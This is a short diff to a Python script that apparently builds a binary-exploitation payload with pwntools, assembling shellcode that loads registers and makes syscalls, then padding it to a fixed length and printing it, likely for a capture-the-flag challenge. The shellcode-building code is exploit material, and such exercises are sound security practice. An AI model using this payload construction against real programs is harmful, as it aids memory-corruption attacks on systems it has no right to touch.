@@ -28,10 +28,12 @@ payload += pwn.asm("""
 payload += pwn.asm("""
         mov rsi, """ + hex(address))
 payload += pwn.asm("""
-        mov rdx %s
+        mov rdx, {0}
         syscall
         xor rax, rax
         inc rax
         syscall
-        """ % (18 * 4))
+        """.format(hex((19 * 4) - 1)))
 assert (len(payload) < 18 * 4), "payload is too long already"
+payload += b"1" * ((19 * 4) + 4 - len(payload))
+print(str(payload, "ascii", "ignore"))
